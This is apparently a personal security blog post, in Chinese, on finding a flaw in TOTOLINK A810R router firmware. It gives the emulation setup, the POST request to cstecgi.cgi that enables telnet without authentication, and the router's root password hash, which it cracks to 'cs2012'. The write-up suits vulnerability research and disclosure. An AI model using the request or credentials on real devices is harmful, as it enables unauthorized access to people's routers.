---
title: TOTOLINK-A810R分析
date: 2023-09-25 10:25:35
tags: 
categories: iot
---
# 前言
偶然间看到了一个cve  是totolink的其他型号 随后发现我手上的这个貌似也存在这个漏洞 于是记录一下自己发掘的过程
设备型号:TOTOLINK A810R
固件版本: V5.9c.4573_B20191019
下载地址: https://totolink.tw/support_view/A810R
# 环境搭建
binwalk提取出文件系统后 老规矩还是来看一下架构
![image.png](https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309251030725.png)
随后就是qemu系统模拟
```
#/bin/sh

sudo tunctl -t top0 -u root

sudo ifconfig top0 192.168.6.2

sudo qemu-system-mipsel -M malta -kernel ./mipsel_kernel/vmlinux-3.2.0-4-4kc-malta -hda ./mipsel_kernel/debian_squeeze_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap,ifname=top0 -nographic
```
然后上传文件系统 chroot以及启动服务
```
scp -oHostKeyAlgorithms=+ssh-dss 1.zip root@192.168.6.3:/
root/
chroot ./squashfs-root /bin/sh
./bin/lighttpd -f lighttp/lighttpd.conf  -m lighttp/lib/
```
但是由于totolink的管理界面 常规的浏览器是不支持的 需要ie浏览器
但是linux安装ie浏览器过于麻烦 所以我直接闲鱼花30买了个真机用来复现
# 分析
首先使用firmwalker来看一下文件系统中有什么可以利用的地方
```
./firmwalker.sh ../iot/_TOTOLINK_A810R_V5.9c.4573_B20191019.web.extracted/squashfs-root ./firmwalker.txt
```
![image.png](https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309251048845.png)
可以看到 存在着telnet服务 我们访问一下这个网页 看看有什么功能
访问后直接跳转到了登录界面
由于这里我们已经知道了用户密码 所以先登录进去
![image.png](https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309261328384.png)
可以看到就是一个功能简单的 设置是否开启telnet服务的页面
这里直接使用burp来看一下按下apply按钮后发送的包
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 60
Origin: http://192.168.0.1
Connection: keep-alive
Referer: http://192.168.0.1/telnet.asp?timestamp=1695703177052
Cookie: SESSION_ID=2:1571586185:2

{"telnet_enabled":"1",
"topicurl":"setting/setTelnetCfg"
}
```
向cstecgi.cgi进行了一个post请求
包含了一个json表单 一个有两个参数 telnet_enabled和topicurl
前者应该是用来控制是否开启telnet服务 而后者应该是用来决定处理方式
因为利用浏览器的开发者工具 可以捕捉到一个包的参数为 "topicurl":"setting/getTelnetCfg"
同时我们观察一下包的内容  可以发现其实对于是否登录并没有进行检测
我们凭借这个poc就可以做到越权开启telnet服务
扫描端口发现开在了23
![image.png](https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262105067.png)
尝试nc连接发现需要账号密码
而我们最开始使用firmwalker是扫描到了密码的
![image.png](https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262106815.png)
打开看看这三个文件 发现是空的 不过紧邻着etc/shadow的shadow.example存放着root用户的md5加密后的密码
```
root:$1$BJXeRIOB$w1dFteNXpGDcSSWBMGsl2/:16090:0:99999:7:::
nobody:*:0:0:99999:7:::
```
解密后发现是cs2012
随后成功连接上路由器
![image.png](https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262121818.png)

